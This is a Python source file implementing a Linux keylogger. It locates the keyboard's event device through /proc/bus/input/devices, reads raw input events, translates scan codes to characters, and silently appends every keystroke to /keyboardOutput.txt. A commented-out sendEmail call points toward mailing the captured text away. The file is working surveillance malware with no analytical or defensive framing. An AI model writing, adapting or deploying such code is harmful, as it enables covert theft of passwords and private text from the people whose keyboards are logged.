import re
import struct
import sys

QWERTY_MAP = {1: "(KEY_ESC)",
              2: "1",
              3: "2",
              4: "3",
              5: "4",
              6: "5",
              7: "6",
              8: "7",
              9: "8",
              10: "9",
              11: "0",
              12: "-",
              13: "=",
              14: "(BACKSPACE)",
              15: "(TAB)",
              16: "q",
              17: "w",
              18: "e",
              19: "r",
              20: "t",
              21: "y",
              22: "u",
              23: "i",
              24: "o",
              25: "p",
              26: "[",
              27: "]",
              28: "(ENTER)",
              29: "(LEFTCTRL)",
              30: "a",
              31: "s",
              32: "d",
              33: "f",
              34: "g",
              35: "h",
              36: "j",
              37: "k",
              38: "l",
              39: ";",
              40: "'",
              42: "(LEFTSHIFT)",
              43: "\\",
              44: "z",
              45: "x",
              46: "c",
              47: "v",
              48: "b",
              49: "n",
              50: "m",
              51: ",",
              52: ".",
              53: "/",
              54: "(RIGHTSHIFT)",
              56: "(LEFTALT)",
              57: " ",
              58: "(CAPSLOCK)",
              59: "(F1)",
              60: "(F2)",
              61: "(F3)",
              62: "(F4)",
              63: "(F5)",
              64: "(F6)",
              65: "(F7)",
              66: "(F8)",
              67: "(F9)",
              68: "(F1)",
              87: "(F11)",
              88: "(F12)",
              99: "(SYSRQ/PRTSCR)",
              100: "(RIGHTALT)",
              102: "(HOME)",
              103: "(UP)",
              104: "(PAGEUP)",
              105: "(LEFT)",
              106: "(RIGHT)",
              107: "(END)",
              108: "(DOWN)",
              109: "(PAGEDOWN)",
              110: "(INSERT)",
              111: "(DELETE)",
              113: "(MUTE)",
              114: "(VOLUMEDOWN)",
              115: "(VOLUMEUP)",
              116: "(POWER)",
              }


def main():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        # look for EV=120013 (keyboard) in input devices
        pattern = re.compile("Handlers|EV=")
        handlers_EV = list(filter(pattern.search, lines))

        keyboardEVPattern = re.compile("EV=120013")
        for index, elem in enumerate(handlers_EV):
            if keyboardEVPattern.search(elem):
                keyboardHandler = handlers_EV[index-1]

        # event file for keyboard
        eventPattern = re.compile("event[0-9]")
        keyboardEventPath = "/dev/input/" + \
            eventPattern.search(keyboardHandler).group()

    # every time a key is pressed, the event that is handling
    # the keyboard does not recieve the characters as it is,
    # but recieves a data structure containing date/time,
    # event type, event code, and value

    FORMAT = 'llHHI'  # represents the data types
    # of the aforementioned data structure passed
    # on pressing a key
    EVENT_SIZE = struct.calcsize(FORMAT)

    keyboardEventFile = open(keyboardEventPath, "rb")

    typedData = ""
    event = keyboardEventFile.read(EVENT_SIZE)
    while event:
        (_, _, eventType, keyPressedCode, value) = struct.unpack(FORMAT, event)
        if keyPressedCode != 0 and eventType == 1 and value == 1:
            if keyPressedCode in QWERTY_MAP:
                typedData += QWERTY_MAP[keyPressedCode]
        with open("/keyboardOutput.txt", "a") as o:
            o.write(typedData)
        # print(typedData, end="")
        # sendEmail(typedData)
        typedData = ""
        event = keyboardEventFile.read(EVENT_SIZE)
    keyboardEventFile.close()


if __name__ == "__main__":
    main()
